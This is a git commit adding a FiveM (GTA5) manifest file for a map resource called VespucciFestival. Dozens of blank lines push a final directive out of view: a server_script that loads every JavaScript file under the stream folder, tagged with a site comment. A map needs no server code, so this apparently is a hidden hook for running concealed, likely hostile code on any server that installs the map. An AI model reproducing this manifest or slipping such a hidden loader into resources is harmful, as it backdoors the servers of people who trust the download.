40c90130a0009f0f3ec225e6dbdd86b61d4b6141
TayMcKenzieNZ <49776183+TayMcKenzieNZ@users.noreply.github.com>
2022-12-07 19:33:11 +1300

    Add files via upload

---
+++ VespucciFestival/fxmanifest.lua
@@ -0,0 +1,65 @@
+fx_version 'cerulean'
+game 'gta5'
+
+this_is_a_map 'yes'
+
+data_file "DLC_ITYP_REQUEST" "laptop_tay.ytyp"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+server_script '/stream/**/*.js'
+-- RARE5M.CO
